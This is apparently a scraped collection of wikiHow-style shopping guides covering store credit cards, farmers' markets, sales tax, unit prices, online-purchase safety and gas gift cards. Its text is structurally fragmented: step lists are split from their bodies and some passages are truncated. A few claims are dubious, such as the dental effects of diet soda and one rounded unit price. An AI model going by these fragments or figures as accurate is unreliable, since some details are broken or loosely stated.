Check if you get cash back.,
Identify the discount you get to open the card.,
Look at the card’s interest rate.,
Analyze any exclusive offers.,
Check how you can redeem rewards.,
Ask if there is a delayed payment promotion.,
Research cards from other retail stores.,
Estimate how much you are likely to save.,

Confirm that you pay your balance in full each month.,
Analyze your credit card debt.",How to Evaluate Store Credit Card Offers," Some store credit cards can only be used at the store or at a small group of stores. These are “closed-loop” cards. If you want a credit card you can use anywhere, then look for an “open-loop” card.Open loop cards often carry the Visa, MasterCard, Discover, or American Express logo on them.;
, Your card might give you a percentage of each purchase. For example, you might get 5% back on every purchase you make at the store.Some cards offer even more cash back, depending on the purchase. For example, a card might offer double cash back for purchases of gasoline.
Other cards will rotate categories each month that allow you to earn extra cash back.Also check whether there are limits placed on the amount you can spend that is eligible for cash back.

, This might be a much larger percentage. For example, you might get 10-20% off your purchase when you open the card. You should understand that this is a one-time offer meant to induce you to sign up.


If you’re going to get the card, make sure you are buying a sufficient amount of merchandise. Don’t get the card when you run in to a store to buy leggings. Instead, sign up for the card when you’ve made substantial purchases.
Ask if there is a cap on the amount you can spend when opening the card., Your store credit card will charge interest for all unpaid balances. You’ll need to closely look at this number. On average, store credit cards have APRs of 25-30%.The interest rate on a store’s credit card often exceeds what you could get for a credit card through a bank., Many store credit cards come with special promos or other perks exclusive to card members. The store clerk should explain these to you. For example, you might get the following:special sales
high-value coupons
invitations to member-only events
no-receipt returns
free gift wrapping
free shipping, Your cash back might be credited to your account and deducted from any balance. However, other cards might mail you a gift card once you reach a certain amount of points.You should ask how you can redeem your rewards.


Some cards make it very difficult to redeem rewards. For example, some cards might redeem rewards only once a year.
Some cards also won’t roll over the balance from month to month.This means you need to redeem the rewards each month or lose them.

, Often, the card comes with an initial 0% financing period.This period allows you to avoid making payments for six months or more. You might think this is a great deal, since you can pay off a little each month.


However, if you don’t pay your balance off in full by the end of the grace period, you may get hammered with a high interest rate.
Check whether the interest rate applies to the balance that remains unpaid or retroactively to the entire initial balance. This could make a big difference.

, There are many options out there. Accordingly, you should shop around for the best card. Compare cash back, interest rates, and delayed payment periods for a variety of cards.


Look online. Some websites, such as NerdWallet, have compared store credit cards for you.Consumer Reports also has a helpful guide to major store credit cards, which is available here: http://www.consumerreports.org/cro/store-credit-cards/buying-guide.

, Look at the card’s cash back rewards and try to calculate how much you will save each year. If you rarely make purchases that qualify for cash back, then there is little reason to get the card apart from the initial discount.

, The more cards you have, the more likely it is that you will forget to make a payment on one.If you are overwhelmed with cards, you might want to pass up a store credit card offer. Experts recommend you limit yourself to three or four cards.If you are diligent with your current cards, you may be able to handle a new card.

, Your credit score helps determine how much you pay for a mortgage and car, as well as whether you can rent an apartment or even get a job. The higher your credit score, the better. A store credit card will impact your credit score in the following ways:To apply, the credit card provider will need to pull your credit history. This will result in a “hard pull.” If you have too many hard pulls, your credit score can go down.
You might get the card for the initial discount and then think about closing it. However, 15% of your credit score is based on the length of your credit. Quickly opening and closing an account can ding you.
Nevertheless, a store credit card is a good option if you are trying to build your credit history. Retail credit cards are usually easier to get than credit cards from a bank. By building your credit history with a store credit card, you eventually can qualify for a credit card from a bank., If you can’t pay your balance off each month, then there is little reason to open a store credit card. The interest you accrue will cancel out any “cash back” that you get for purchases.


The other perks you might get—such as coupons—will also be canceled out.
Remember that stores offer these cards for a reason. They are hoping to make money off you!

, If you get cash back, you might be tempted to buy more than you normally would—and more than you can realistically pay off. Add up your total credit card debt. Those who are struggling with debt should not take out a store rewards card."

Locate businesses or dealers who sell refurbished refrigerators.,
Look for refurbished refrigerators on the Internet.,
Contact sellers to ask specific questions about the refrigerator.,
Verify that the refrigerator works before purchasing.",How to Buy a Refurbished Refrigerator," This will help narrow your options when you shop.


Decide whether you want a top-and-bottom door style or a side-by-side door style. Refrigerators with side-by-side doors are usually wider in length.;
, This process may be essential if you need a refrigerator in a specific color that matches your kitchen theme or a stainless steel model that matches your other appliances.

, Some examples of special features may include a built-in ice and water dispenser on the front of the refrigerator, an automatic ice-maker in the freezer, or settings for your crisper.

, This will prevent you from buying a refurbished refrigerator that is too large for the space in your home.


Use a measuring tape to determine the width, height, and depth of the space in which you will place your refrigerator.

, Buying a refurbished refrigerator from a local seller may allow you to see the refrigerator in person and verify that it works.


Look for classified ads in local newspapers or online at a classified ads website.

, In most cases, dealers or businesses will offer you a warranty on refurbished refrigerators or their parts.


Browse through a phone book or online business directory to locate businesses or dealers in your local area.

, Some websites may provide you with explicit details about the features or history of a particular refurbished refrigerator, in addition to offering a product warranty.


Perform an Internet search for online companies or major retailer outfits that sell refurbished refrigerators.

, Making telephone calls or sending email inquiries will help you determine if a refurbished refrigerator is worth purchasing.


Ask the seller about the energy efficiency of the refrigerator. Some older refrigerator models may require higher amounts of energy and cost more to operate. If the refrigerator contains an Energy Star logo or a similar logo for the energy rating systems in your country, it may result in lower energy bills.
Ask the seller how long the refrigerator has been unused or unplugged. Most refrigerators need to be plugged in continuously to maintain internal working parts, such as seals.
Ask the seller why they are selling the refrigerator. This will help you determine if they are replacing the refrigerator with a newer, improved model or if the refrigerator does not work properly.
Ask the seller about problems the refrigerator has experienced in the past. This will provide you with insight regarding any potential future issues you may have with the refrigerator.
Ask about the environment in which the refrigerator was used. This will help you determine the wear and tear of specific parts. For example, if the refrigerator was stored in an outdoor garage, the compressor most likely worked harder in the summertime during extremely warm or hot temperatures.

,


If you are purchasing the refurbished refrigerator online or from a far-away location, verify the refrigerator comes with a product warranty to protect yourself in the event the refrigerator doesn't work properly.
Test the door seals. Place a piece of paper between the refrigerator and its door, then try to pull the paper out. If the paper slides out easily, the hinges on the door may need to be adjusted, or the seal need to be repaired.
Test the inside racks and drawers. Pull each rack and drawer out, then slide them back in. This will allow you to determine if these parts can be removed for cleaning or allow easy accessibility to foods you place in the back.
Turn the knobs and switches for lights and temperature controls to make sure they can be adjusted.

Research and locate both your nearest farmers' market and other nearby markets.,
Learn more about the farms and farmers that attend the markets.,
Come to the market with a flexible palate.,
Come to the market prepared to flatter.,
Offer the farmers more than cash.,
Add value to bulk purchases.,
Shop with friends or family.",How to Save Money at a Farmers' Market," In order to get screaming deals at the farmers' market, you first need to find it. Generally, farmers' markets run from early spring to late fall, but depending on where you live, your local market may be open a shorter time period or may be open year-round. Some markets are open daily during the season, while others are open only one or two days a week, most likely on weekends.


If there are several markets in your area, visit all of them to find the best selection and best deals.;
, Although not true for every market, generally those selling agricultural products at the market the same people who grow or produce the items. Getting to know the producers/salespeople is your first step in building a lasting relationship with them and enjoying the great deals that can come from such a relationship.

, Often it is the case that common items (e.g. carrots, potatoes, and onions) are more expensive at the market than at conventional grocery stores. However, seasonal and specialty products that are outside of mainstream consumption (such as ethnic, heirloom, or rare vegetables) can be purchased for far lower prices than those demanded at the local supermarket. A flexible palate will not only introduce you to foods you never knew existed; you’ll also enjoy big savings.

, If there’s one way to a farmer's heart, it's talking food, especially talking about the food he or she grew. If you tell a vendor that you absolutely loved the way his or her heirloom Brandywine tomatoes complemented the basil you bought from him last week, there is a strong likelihood he or she will cut you a deal on your next purchase. The best reward to working all week in the field is to hear about how much a customer enjoyed eating the products a farmer grew. Farmers, like everyone else, appreciate compliments and knowing that their services make people happy.

, Farmers are independent and sometimes unconventional. The nature of farming instills in nearly all farmers a strong desire and tendency for bartering. A farmer, like anyone else, specializes in a certain trade or skill. If you also have a skill or service that you can offer—website design, carpentry, tax preparation, etc.—a farmer may be willing to trade for your services. You may be able to get all your vegetables free during the summer in return for using your own skills to help your local farmer out.

,


Because most vendors at farmers' markets grow seasonal products, there is often a large surplus of certain products at certain times. If you are willing to purchase large quantities of surplus items in peak season, you can add value to your purchase by saving seasonal food--by canning, freezing, or drying it, for example--for consumption out of season. For instance, the market price of raspberries is twice as much in winter as in summer. If you require a smoothie every morning, you can simply purchase large quantities in summer, freeze them, and enjoy savings as part of a complete breakfast. Make tomato gravy from those heirloom tomatoes, turn those beautiful onions into sweet onion marmalade, and dare to make pumpkin pie straight from the pumpkin.

, Consider going in with other people and purchasing “cases” of food. Then, once you are home from the market, you can split up the wonderful food you just purchased at rock bottom prices!

Determine the sales tax rate in your location.,
Convert the sales tax percentage into a decimal figure.,
Multiply the price of the item by the decimal figure you calculated in the previous step.,
Add the amount of tax you calculated to the listed price.",How to Add Sales Tax1," You can look it up online or ask a sales associate what it will be. While states usually set a statewide sales tax, some municipalities add their own taxes on top of that. This means that the sales tax rate can vary drastically when moving between different cities or counties.


Sales tax is not charged on all items you buy. Check online to see what is, and is not, taxed in your area. ;
, Take the percent number and imagine a decimal point after it. Now move that decimal point two spaces to the left, giving you the decimal equivalent of the sales tax percentage. For example, if the sales tax rate is 8%, the decimal figure will be .08.

, This calculation will give you the amount of tax that will be charged for your purchase. For example, if the item you want to buy is $20, multiply 20 times .08 and you get 1.6. That means you will have to pay $1.60 in sales tax.

, This will give you the total price you will have to pay at the register. Using our same example once again, if you will be charged $1.60 on your $20 item, simply add 1.6 to 20, for a total of $21.60.

Write a detailed list.,
Include healthy snacks in your list.,
Plan one shopping trip a week.,
Make a ‘no-no’ list.",How to Avoid Temptation at the Grocery Store1," Going to the store without a list is like going into battle without a plan: you’ll end up browsing the aisles, buying things you don’t need, and skipping things you do. Improve your chances of success by mapping out your grocery trip ahead of time, listing all of the essentials for the week—for example, meat, dairy, and produce—as well as any snacks, non-grocery items such as toilet paper or toothpaste, and beverages.If you’re having trouble figuring out what you’ll need for the week, try creating a meal plan for the week and then listing the ingredients needed for each meal.
There are many mobile apps, such as BagIQ and GroceryPal, which can assist in list-making.;
, While you want the majority of your cart to be taken up by essential meal components, you should also keep some ready-made, healthy nibbles handy. Putting these diet-friendly foods, such as kale chips or shelled nuts, on your list will ensure that you have some snack options when you’re peckish without deviating from your basic, healthy plan.


If you don’t trust yourself to opt for healthy snacks while in the store, sign up for a subscription box, such as Naturebox or Graze, that does your health-homework for you and sends delicious snacks right to your door., Not only should you plan what you want to buy at the store, but you should also set a schedule for when and how often you’ll go shopping. If you don’t do this, you’ll find you go to the grocery store more frequently, stopping in to buy ingredients or snacks on an ad hoc basis rather than consolidating your purchases in a single, weekly trip.Weekly trips might be insufficient to keep fresh fruit and veggies stocked in your house, so allow yourself semi-weekly trips to the produce market.

, Everyone has a few unhealthy foods they find particularly difficult to resist. Rather than pretending these items don’t exist when planning your grocery trip, it can help to draw up a special ‘no-no’ or ‘don’t buy’ list. By doing so, you’re being honest with yourself about your particular weaknesses and making it an explicit priority to conquer them.For example, include potato chips, high-sugar cold cereals, candy bars, and pre-packaged baked goods on your ‘don’t buy’ list.

Before you venture into a shopping center, make a list with two categories: Things you need and things you want.,
Put yourself in a good mood.,
Do some preliminary research.,
Budget.,
Pack a bag or purse the night before that include your list, a map, a water bottle, some snacks, some emergency cash, a credit card and ATM card, a cell phone or coins for a pay phone or a phone card, and a positive attitude!,
Plot out your plan of action on the map.,
Try everything on.,
If you are purchasing many items, inquire ahead of time about locker rentals at the mall.,
Reward yourself with an ice-cold beverage or a snack from the food court at the end.",How to Have a Successful Day of Shopping," This will help you sort out your priorities. Vow to yourself that you won't buy something you want at the expense of something you need.;
, None of the employees in the stores want to deal with anyone in a bad mood. You'll get much further being pleasant while requesting help or looking for an item. Remember this even when you call stores for an item. No one wants to be yelled at by a perfect stranger while they're doing their best to do a good job!

, Find the approximate price of the desired items to make sure you are getting a good deal, and also locate the stores where these items are being sold. The Internet is always a good place to start. Write the lowest price you found next to the item on your list. That way, you'll have more options, especially if you find yourself coming dangerously close to the limits of your...

, Decide how much money you'll allow yourself to spend. If possible, leave all your credit cards at home and withdraw enough cash from the bank to support your grueling day of shopping. When you're dealing with cold, hard cash, it's harder to go over your budget. However, it may be a good idea to keep one credit or ATM card with you in case of an emergency (emergency pairs of shoes or boxes of chocolates don't count!) but put a note on it that says ""Use ONLY in case of a real emergency!""

, It is better to be more prepared than to be left in an unsafe/undesirable situation. Also, keep in mind that you might not be able to bring your tote into the store, so make sure you keep valuables (money, phone card, etc.) in a safe, next-to-body layer. This will additionally help prevent theft.

, Figure out the most efficient course and stick to it.

, It is better to spend more time in a store initially than to be unsatisfied with what you buy and return later to wait on the Customer Service line. Fully inspect all items before you try them on for safety and sanitary reasons.

, You don't want to slog around like a luggage-laden wanderer at an airport.

, You've had a long and busy day, and you deserve it!

Know what unit price is.,
Know the calculation formula of unit prices.,
Compare unit prices from different brands and sizes to know if you're getting the most out of your money.,
See how coupons can really affect final prices.,
Experiment by comparing store brands to manufacturer brands.",How to Calculate and Compare Unit Prices at the Store," The unit price of a product is basically what the cost of each pound, ounce or gram, square foot or meter, etc., of the product is. In some grocery stores and supermarkets, the unit prices are shown with the total price but this isn't always available, so it's important to know how to work this out for yourself.;
, The math figure is Cost of Item / Quantity = Unit Price. Simple examples are provided below:


18 oz of peanut butter is $2.79
$2.79 divided by 18 = $0.16 per ounce
20 ball point pen package is $3.00
$3.00 divided by 20 = $0.15 per pen.

, For example:


24 oz of vegetable oil from Store A is $2.49, which is $0.10 per ounce
32 oz of vegetable oil from Store B is $2.99, which is $0.09 per ounce
In this example, the better bargain is from Store B. You're paying $0.50 more overall, but you're also paying less per ounce.

, At times when you use coupons in your transactions, the unit prices really change and can affect what you choose from the shelves. Let's use the example from above with a ""Save $0.50 off one 24 ounce or larger vegetable oil"" coupon, but Store A doubles all coupons up to $0.99.


24 oz of vegetable oil from Store A is $2.49, now $1.49 with doubled coupon
32 oz of vegetable oil from Store B is $2.99, now $2.49 with coupon
Store A's current unit price is $0.06, while Store B's unit price is $0.07.
Because of Store A's doubled coupon price, the unit price changed and is now lower than Store B, thus getting 24 oz of vegetable oil is a better deal than 32 oz.

, You can also calculate with other types of units, for example 4 versus 8 toilet paper rolls or the different amount of loads/ounces of laundry detergent.

The goal in estimating sales tax is to make the math simple enough to do in your head. Don't bother with exact amounts, just estimate well enough to make sure you have enough money to pay for what you want to buy. By using an estimate of 10% it will mean that, in most cases, you are rounding up, making your estimate more than you will actually pay.


If you are actually rounding the tax rate down, make sure to remember that your estimate will be a little bit less than you will need to pay.

, This will give you a good, quick estimate of how much tax you will be charged. No need for complicated calculations, just move the decimal over and that will give you 10% of the cost on the tag.


In doing this, you are actually multiplying the cost of your item by the decimal equivalent of 10%, which is obviously really easy! For example, .10 times $20 equals $2.

, Because we rounded up, your estimate will probably be higher than the tax actually charged, but you will know you can afford to pay the total cost. To use our example from the previous step one more time, $20 plus $2 makes the estimated total cost including tax $22.

Don’t go shopping when you’re hungry.,
Challenge yourself to stick to a certain time limit and budget.,
Keep to the periphery of the store.,
Sip on a bottle of water while shopping.",How to Avoid Temptation at the Grocery Store2," Studies have shown time and again that going shopping while hungry can cause you to make impulse buys and unwise indulgences at the grocery store. Fortunately, you can easily sidestep this pitfall by eating a healthy snack, such as an apple, a salad, some nuts, or string cheese, before shopping.In the same way, avoid shopping when you’re tired. Going shopping after work or on your way back from the gym can impair your ability to make good choices, as well as make you particularly drawn to high-sugar, high-fat foods., Studies have shown that setting specific goals for yourself—be it at work or in the gym—can improve your chances of success dramatically. If you challenge yourself to attain a specific goal, you’re making yourself accountable as well as establishing incentive for your efforts.Translate this principle into successful grocery shopping by making your trip a race against time and budgetary constraints.


For example, challenge yourself to get all your shopping done in 30 minutes and for under $100.

, Most grocery stores are designed so that all the essential—and healthy—foods are stored on the perimeter of the store, meaning that you have to pass through aisles of processed, high-temptation foods in order to get to them. So, even if you’ve dropped in for a bottle of milk and an onion, for example, you’ll have to traverse most of the store—and see a huge range of tempting products—in order to grab these basic items.Stay focused and on-task by skirting the periphery of the store rather than passing through the center aisles.

, In addition to snacking on something healthy before going grocery shopping, you can keep your stomach full and cravings suppressed by drinking water as you navigate the store.Just be sure that you opt for pure or sparkling water rather than juice or soda, as these sugary drinks can pack a calorific punch while actually making you crave food more quickly.


While diet sodas have no calories, they’re hardly a healthy option. Studies have shown that the fake sugar contained within does just as much damage to your teeth as the full-sugar variety, and that it can actually spur cravings for sugar.Carrying around an aluminum or plastic reusable water bottle is a good idea at all times, not just when you’re out grocery shopping. This simple practice encourages you to sip throughout the day, meaning you feel fuller and also that your body receives sufficient hydration to function properly."
"
Shop alone in order to avoid peer pressure.,
Say no to samples.,
Don’t buy something just because it’s on promotion.,
Shop farmers’ markets and other specialty produce shops.,
Use an online shopping and delivery service like Peapod.",How to Avoid Temptation at the Grocery Store3," Having a companion at the grocery store can make an otherwise tedious chore fun and diverting. Unfortunately, though, it can also distract you from list-focused goals and present you with additional temptations. Kids in particular can pressure you to purchase unhealthy snacks and beverages, so leave anyone who encourages splurging and bad behaviors at home when it’s time to grocery shop.In contrast, if you have a gym buddy or other like-minded friend in your life, feel free to take them along! A health-conscious companion can help you resist temptation and stick to your list.

, Though a tiny piece of cheese or a bit of sausage might seem harmless, indulging in a free sample can actually derail your whole shopping trip. After all, free samples are designed to encourage you to buy something you wouldn’t ordinarily, and they can cause a craving for something sweet or salty which you didn’t have when entering the store.Massive chain retailers like Costco are particularly sample-heavy, so avoid temptation by frequenting local markets instead.

, Just like free samples, these in-store promotions are designed to get you to deviate from your list, to buy items you weren’t planning on purchasing when you entered the store in the first place. So, while it might seem cost-efficient to go for something on a two-for-the-price-of-one promotion, remember that your priority is sticking to your list, not buying as much food as possible at reduced prices. This isn’t to say that you can’t take advantage of special sales and discounts. Do so in a smart way, though, by signing up for your store’s customer loyalty card, or using a mobile coupon app that helps you find discounts on items already included on your list.

, Foregoing the supermarket in favor of your local farmers’ market has many health and financial benefits. Not only do you support local businesses, but you also pack your visual horizon with fresh, whole foods while limiting your exposure to those processed, tempting items which fill the supermarket.If there are some items on your list not available at the farmers’ market, wait to visit the supermarket until after you’ve done your shopping at the farmers’ market.

, If you still find yourself struggling and failing to stay on-track at the grocery store, fret not! Simply sign up for an online grocery delivery service and you can shop the once-hazardous aisles of your grocery store from the comfort of your own home. This practice allows you to find all the items you need, while eliminating your ability to browse unnecessary items and make impulse buys.If you’re trying to get into cooking but still find ingredient-shopping challenging, try a subscription box, such as Blue Apron, PlateJoy, or HelloFresh. These services deliver specific recipes, as well as the necessary, measured-out ingredients for said recipes, to your door every week."

Arrive and start shopping early.,
Find out beforehand what’s in season.,
Walk through the whole market before making purchases.,
Shop based on produce availability and price.,
Inquire about second-tier produce at discounted prices.,
Ask vendors about their products.,
Ask about discounted prices at the end of the day.,
Buy your produce in bulk.,
Bring your own bags and a cooler.,
Opt for simpler produce, rather than following trends.",How to Get the Most for Your Money at Farmers' Markets," The best items of the day are often sold first, so to make sure that you have your pick of the produce, arrive early. Depending on the season and how much demand there is for their products, some vendors may sell out of their highest-quality produce quickly. Make sure that you’re one of the first customers in line, and you’ll be able to purchase what you please.However, don’t arrive excessively early. If you get there before the farmer’s market even opens, you may slow down or distract the vendors who are trying to set up their stalls.;
, It’s worth your while to know which produce will be available during the season (and in the region) where you’re shopping. This will allow you to plan ahead and have realistic expectations for the types of produce you will and will not be able to find at the market. Buying produce when it’s in season will also save you money, since you won’t be paying for produce that’s been shipped in from another region.For example, If you show up to a farmer’s market in Colorado in July expecting oranges, you’ll likely be met with disappointment.
In warmer regions like central and southern California, greens like leeks, spinach, sprouts, and lettuces will be in season year-round.Gourds (including pumpkin and squash) and more hearty veggies like beans are typically in season in fall and winter., Rather than filling up your basket or cart at the first two or three stalls you visit, plan to walk through the full farmer’s market before making purchases. This will allow you to compare the prices, quality, and quantity of produce vendors with similar offerings.If you’ll be buying any perishable or frozen items (e.g. raw meat), purchase this last so you can bring it directly home.

, Although many farmer’s-market shoppers show up with a shopping list, you can save more money if you shop more spontaneously. Allow daily specials and discounts to guide your shopping. You may be able to find marked-down items that can substitute for what you’d hoped to find, or get ideas for new dishes by combining various types of available produce.For example, if you had planned to buy romaine lettuce, but a vendor is offering spinach at a 50% discount, save money by purchasing the spinach.

, If you’re shopping on a budget and trying to save some money, ask vendors if they have any cosmetically damaged or misshapen produce for sale at a lower price. These second-tier products—typically called “seconds”—will taste the same, but are often kept out of sight so that the better-looking fruit will sell first.Vendors may also be willing to throw in mildly bruised or scuffed up fruits for free if you ask.

, One major advantage of farmer’s markets is that, unlike at supermarkets, you can speak directly with the people who grow your produce. Most vendors are more than happy to talk about their work and the produce they’re selling, especially if you stop by at a time when there isn’t a line.If you have any questions about the food, ask. Bring up things like:


Do any of the products contain GMOs?
Were any pesticides used on the produce?
Where, and under what conditions, were the products grown?
Are products organic and/or free-range?

, Although the highest-quality produce and goods will likely have sold out by the end of the day, farmers and other vendors may be more willing to off discounts or two-for-one deals. It’s inconvenient for vendors to take the bulk of their good back home with them, so many will offer up to a 20% discount as the market’s closing time approaches.Keep in mind that certain farmer’s markets may have rules that specifically prohibit the discounting of merchandise.
Avoid trying to haggle or negotiate with vendors. If they have discounted merchandise, they’ll let you know.

, If you know you’ll use a large amount of a specific type of produce—from tomatoes to lettuce to cherries—plan to buy them in bulk. This will allow you to save money, as vendors are typically willing to mark down bulk sales by as much as 15 or 30%.They may even offer a larger discount if you offer to become a weekly (or monthly) customer and buy in bulk frequently.


This brings an added benefit: you can take the entire case home with you. Produce is often delicate and easily damaged, and bringing produce home in the case it’s sold in (often made of wood or cardboard) will prevent it from being damaged in transit.

, Although vendors—or the market itself—may offer paper bags or tote bags, they’ll almost certainly be for sale, not free. To save some money at the farmer’s market, bring your own bags with you. Also bring a cooler with some ice in it, so that you can store fresh produce without fear of it wilting or spoiling in the sun., Trendy or specialty food items that are popular at the moment—such as heirloom tomatoes and beans and shishito peppers—will be marked up and cost more than their more traditional counterparts. You can save money by purchasing simple produce, such as local tomatoes and green beans."

Be succinct and direct when you send your message.;
, If you’re unable to cancel the purchase online, you’ll have to call customer service. When you speak to customer service, provide them with your order number and tell them you want to cancel it. They may be able to cancel immediately.The customer service number is usually found under “contact” information toward the bottom of the website.
Be very polite. For example, say “please” and “thank you.”
If they say they can’t cancel the order, ask to speak with a supervisor.

, Many companies will not let you cancel a purchase freely if you just changed your mind about a product. Thus, you need to provide a legitimate reason for why you no longer want the product. Some reasons may include:

The ad listing misrepresents the product.
You found a cheaper price.
The product is damaged or is not the exact product you ordered.

, If you are able to cancel your order, write down the confirmation number that the website or customer service representative gives you.

Contact your bank or credit card provider to determine if your card has such protections. If not, try to find one that does offer insurance for online purchases.Credit cards are more likely to offer fraud protection than debit cards.
Some banks offer “single-use” credit card numbers. These can be used for only one purchase so that, even if your information is compromised, it can’t be used again. Ask your bank if this is an option.;
, After making a purchase, always record the details of the time, date, receipt number, and order confirmation. If you cannot print one off, take a screenshot as proof of purchase.

, When shopping online, check your credit and debit card statements frequently. Watch for suspicious charges and check charges against your records. Call your bank or credit card company immediately if you see anything suspicious., An online purchase should only require credit card information, address, and phone number. If the website is also asking for your social security number, you should be suspicious. This information can be used to steal your identity and should be unnecessary for an online purchase., Malware programs that are downloaded online can monitor your keystrokes and pick up your account information even from secure websites. Download programs like Ad-Aware to scan for malware. Don’t download information from sites you aren’t familiar with. Be wary about clicking on links in viral emails.Also, update your operating system frequently. Sometimes operating system updates will provide important protection from security threats., If your passwords aren’t well designed, a hacker can guess them and use saved account information to order products. Try to use different passwords for each website and avoid common words.


Refrain from using common words as passwords or information that has personal significance a hacker could figure out, including a birthplaces or anniversaries.This also applies to start up passwords for your computer and cellphone. If your information is saved on your hardware, someone who takes your phone or computer can use them to make purchases. Be sure that all your hardware is password protected and will go to a security screen if left unattended for a few minutes.

, Do not buy anything on public computers, including those available at libraries. If you do, your private information will be saved where others can access it. You should even be careful about making a purchase with your own laptop in a public place. Someone might see you input your data or be able to get information from a shared Wi-Fi connection.If you must make a purchase in public, using cellphone data is more secure than a public Wi-Fi connection. Consider downloading the retailers’ app to make the purchase., Establish that the website you are working with is real. An easy way to do this is to shop with well-known businesses that you are familiar with. Some scams will pretend to be big box stores, so check the domain names carefully to ensure that it is the correct website.Check the web address to verify that there are no misspellings, like “Equifacks"" instead of “Equifax.”
Fake websites will also replace a “.com” with a “.net.” Check the website carefully for these errors.
Today most major chains with physical locations have parallel websites. These retailers should be reliable.

, It is important to establish the identity of online retailers that you are not familiar with. Search the website for an email address, postal address, and telephone number. You should be suspicious if this information is not readily available.Scams artists are unlikely to publish their addresses or phone numbers, because it makes them easier to trace. Any reputable company should at least have a helpline. If you are uncertain about a website, call the helpline and see if you get a response.

, Research the company's ranking through the Better Business Bureau. Look online for reviews of the website, but be suspicious if the reviews are too glowing; some frauds promote fake reviews to lure in unsuspecting victims., The retailer should be able to provide a clear price for the product you are purchasing, including shipping. The retailer should also be able to tell you what exactly you will get in return.


Avoid, for example, online deals that promise a chance to win something if you make repeated subscription payments., Reputable companies will have a public page on their “privacy policy.” Research this to determine whether the company uses your information for something other than the purchase. Many businesses, for example, will use it to email you with updates or deals. Some might pass your information to third parties.Even most legitimate online retailers will use your information to “spam” you with advertisements. You need to decide for yourself whether that is something you are willing to live with.

, Do not make purchases on websites that don't have Secure Sockets Layer (SSL) encryption. To check that your website has SSL:


Look for a padlock symbol in your browser address bar. A closed padlock should appear when you enter into a website with SSL.The first letters in the address bar should change from “http” to “https.” Typically this will not happen until you reach the payment stageAn unbroken key may also be present on a secure website., If you are having trouble distinguishing bad and good websites, use an online phishing filter. There are various phishing filters, like SmartScreen Filter in Internet Explorer, that will warn you when they detect a questionable website. SmartScreen comes standard with most new Microsoft computers., Emails and social network notifications, some of which appear to be from well-known companies, are circulated around the internet to “phish” for your private information. Legitimate companies, including banks, will never send you an email with a link requesting your login, password, or credit card details.


Be suspicious of any unsolicited advertisements that seem to promise too much. If someone, for example, is offering you a free tablet, chances are that they are not legitimate.If the deal is supposedly offered through a major retailer, go directly through the retailers’ website rather than following the link in the advertisement.
Popular scams will often be discussed on the news. Watch the news to keep abreast of current security threats.

Before purchasing your product, always double-check the shipping costs, particularly for heavy items like electronics and furniture. Try not to get hooked into shipping “deals,” either. Oftentimes, customers end up buying more stuff than they need because of shipping “deals.”For example, if one store has a better deal, but you still need to pay for shipping, factor in the shipping costs before determining which deal is better.
Check to see if you can purchase heavy items online, and then pick them up at the store.

, Thousands of fake websites and malicious mobile apps are created each year to scam consumers. Therefore, when shopping online, make sure you are shopping on the store’s actual website. And, make sure to download stores’ official apps.Poor web design is a red flag that a site is not the official site. Also, make sure the site begins with “https” or has a lock symbol next to the address, and ends with “.com” as opposed to “.co”
Research mobile apps well before downloading them. Do not rely only on reviews when downloading apps. Try to download apps that are linked to the retailer’s official website.

, Have order confirmations and receipts sent to your email address. Create a separate folder, like “Cyber Monday Receipts,” in your email so you can keep track of your purchases and keep your receipts safe. This is really helpful if you need to make a return or exchange, or if you want to monitor your purchases.If you are making a lot of purchases, monitor your bank account frequently during and after Cyber Monday.

Choose your retailer.,
Look for a retailer that offers perks.,
Think of the right occasion.Gas cards are good for certain situations where you’re obligated to give a gift but don’t know someone well.,
Choose the amount.",How to Buy Gas Gift Cards1," Almost every major gas station offers gift cards.To decide which station’s card you want to buy, ensure that the person you’re buying the card for has a gas station of the corresponding card nearby. For instance, if you buy the card for your son who moved away, you might not know what gas stations he has nearby. Use an online map system like MapQuest to look up gas stations near him.


If you aren’t trying to make a big surprise of the gas gift card, you could just ask the person you’re buying the card for what gas station they usually go to.
The major players such as Exxon and Shell are great choices as are 7-11, QuikTrip and RaceTrac convenience stores. Just check to be sure they are in the right area.
All gas stations are basically the same. The only “wrong” choice is buying a card for a gas station that is inaccessible to the person you’re buying the card for.
A child headed to college will be using one of the stations around their college. Know which gas station they prefer when choosing what card to buy.;
, Some gas stations offer special savings when you use a gift card. For example, Walmart offers a savings of $0.03 per gallon off the price of gas per gallon when you use their gift card at the gas pump.Look for similar deals that give you a little extra mileage for your money when deciding which card to buy.

, For instance, if you have a gift exchange at your workplace, or want to distribute a little something extra to a departing employee, student, or client. Of course, giving a gas gift card isn’t limited to these situations. Since gas gift cards are useful for anyone who drives, you could also give a gas gift card to a friend or close family member.


Family members who are making a long drive to visit you might appreciate a gas card as a going-away gift.
Gas gift cards make great stocking stuffers.
You could tuck a gas gift card inside a birthday card.

, Gas gift cards usually come in predetermined amounts. Multiples of $5 and $10 are common. For instance, you might find gas gift cards available in amounts like $25, $50, $75, and so on.Decide how much you want to spend on gas gift cards before making your purchase.


If you are unable to find the exact amount you want, buy more than one gas gift card. For instance, if you want to give your friend $35 in gas gift cards, you might need to buy a $10 and a $25 gas gift card.
It’s usually better to buy a card with a value of at least $25. Not only is a full tank of gas rarely less than $25, but values of less than that often require a surcharge of $0.25 or $0.50."

, Many big-box retailers and grocery stores offer gas cards for sale.If you’re shopping at a store that sells gas gift cards and you want or need one, choosing to buy one at one of these stores can be convenient. Be sure you know what gas station the person you’re buying the card for patronizes before making your purchase.


Sometimes you can “buy” a gas gift card by spending a certain amount of money at a given store. For instance, sometimes grocery stores offer free gift cards in $10 amounts if you purchase $50 worth of groceries. If you’re going to buy groceries anyway, you might as well get the gift card along with everything else. Buy canned goods that won’t spoil if you’re having trouble hitting the minimum purchase price.
Check to see if there is an extra charge on top of the cost of the actual money you’re putting on the card. Usually, there isn’t unless the card is of a low (less than $25) value. If there is, shop elsewhere for the gas gift card so you don’t have to pay the extra fee.

, The number is usually listed online through the gas station’s website. You might be able to obtain the phone number from employees at your local branch of the gas station, too. If you want to buy your card from home but don’t feel comfortable making a purchase online, this is probably the way to go.

Identify from where your car warranty came.,
Look at the breakdown for parts and labor.,
Consider the time frame of the warranty.,
Quantify coverage in your warranty.,
Understand record-keeping requirements for your warranty.,
Evaluate what kinds of repairs are offered by the warranty.",How to Understand a Car Warranty," This is one of the most vitally important steps in dealing with any car warranty. There's a big difference between the comprehensive warranties that come from a manufacturer and a dealer's warranty.


